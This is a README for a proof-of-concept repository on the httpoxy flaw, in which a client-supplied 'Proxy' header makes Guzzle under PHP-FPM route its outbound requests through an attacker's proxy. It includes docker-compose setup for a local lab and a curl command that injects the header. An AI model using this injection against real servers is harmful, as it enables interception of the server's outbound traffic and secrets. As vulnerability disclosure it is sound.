# PHP-FPM httpoxy POC

> Based on: https://github.com/httpoxy/php-fpm-httpoxy-poc

Some command-line HTTP clients support a set of environment variables to configure a proxy. These
are of the form `<protocol>_PROXY`; `HTTP_PROXY` is particularly noteworthy.

Separately, PHP takes user-supplied headers, and sets them as `HTTP_*` in the `$_SERVER` autoglobal.

## Steps

This is how the vulnerability works:

1. Do the usual PHP thing of exposing user-supplied headers as `$_SERVER['HTTP_*']`
2. Be using Guzzle from FPM or Apache (haven't tested with other SAPIs, assume some others possibly vulnerable too)
3. As an HTTP client, inject a `Proxy: my-malicious-service` header to any request made
4. Watch as Guzzle helpfully sends the request to the malicious proxy, supplied by the client

## Using this repo

Here is how you can see it in action:

1. Start a new test instance of the vulnerable script:

    ```sh
    docker-compose build
    docker-compose up
    ```

2. Fire a request at your vulnerable script, and watch the data arrive at the  proxy:

    ```sh
    curl -H 'Proxy: proxy:8182' 127.0.0.1:8081/guzzle.php
    ```



